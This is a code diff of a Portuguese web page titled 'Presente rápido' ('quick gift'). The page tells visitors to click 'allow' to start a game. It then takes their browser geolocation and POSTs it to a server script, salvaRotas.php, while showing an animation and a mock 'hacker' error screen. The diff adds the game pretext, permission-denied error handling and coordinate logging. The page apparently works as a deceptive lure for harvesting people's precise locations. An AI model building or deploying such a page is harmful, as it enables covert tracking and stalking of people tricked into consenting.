@@ -6,18 +6,48 @@
   <title>Presente rápido</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+    integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
   <link rel="stylesheet" href="style.css">
 </head>
 
 <body>
+  <div class="container">
+    <div class="row">
+      <div class="col-12 justify-content-center d-flex text-center box_mensagem">
+        <div class="alert_style alert alert-warning flex-row w-100 m-auto justify-content-auto text-center" id="mensagem_de_cuidado"
+          role="alert">
+          <p class="m-auto">Para começar o jogo, por favor clica em permitir</p>
+        </div>
 
-  <div class="content">
+        <div class="alert_style alert alert-danger d-none flex-row w-100 m-auto justify-content-auto text-center" id="mensagem_erro"
+          role="alert">
+          <p class="m-auto">Ops! é necessário permitir para continuar</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="root d-flex">
+      <div class="loop-wrapper">
+          <div class="mountain"></div>
+          <div class="hill"></div>
+          <div class="tree"></div>
+          <div class="tree"></div>
+          <div class="tree"></div>
+          <div class="rock"></div>
+          <div class="truck"></div>
+          <div class="wheels"></div>
+        </div> 
+    
+  </div>
+  
+  <div class="conteudo d-none">
     <img src="hacker.svg" alt="">
     <p>OPS! Ocorreu um erro</p>
   </div>
 
   <canvas id="c"></canvas>
-
 
   <script src="https://code.jquery.com/jquery-3.4.1.min.js"
     integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
@@ -28,21 +58,36 @@
       setTimeout(function () {
         $('.content').hide();
         $('#c').css('display', 'block');
-
-      }, 3000);
+        $('.root').addClass('d-none').removeClass('d-flex');
+      }, 7000);
       var x = document.getElementById("demo");
 
       getLocation();
 
       function getLocation() {
         if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(showPosition);
+          navigator.geolocation.getCurrentPosition(showPosition, handle_error);
         } else {
-          x.innerHTML = "Geolocation is not supported by this browser.";
+          $('#mensagem_erro').removeClass('d-none').addClass('d-flex');
+          $('#mensagem_de_cuidado').addClass('d-none').removeClass('d-flex');
+          $('.conteudo').hide();
+        }
+      }
+
+      function handle_error(err) {
+        console.log(err.code);
+        if (err.code == 1) {
+          $('.box_mensagem').addClass('d-flex').removeClass('d-none');
+          $('#mensagem_erro').removeClass('d-none').addClass('d-flex');
+          $('#mensagem_de_cuidado').addClass('d-none').removeClass('d-flex');
+          $('.conteudo').hide();
         }
       }
 
       function showPosition(position) {
+        $('.box_mensagem').addClass('d-none').removeClass('d-flex');
+        $('body').css('background', '#009688');
+
         $.ajax({
           url: 'salvaRotas.php',
           type: 'POST',
@@ -58,7 +103,7 @@
           }
         });
 
-        // console.log("Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude);
+        console.log("Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude);
       }
     });
   </script>
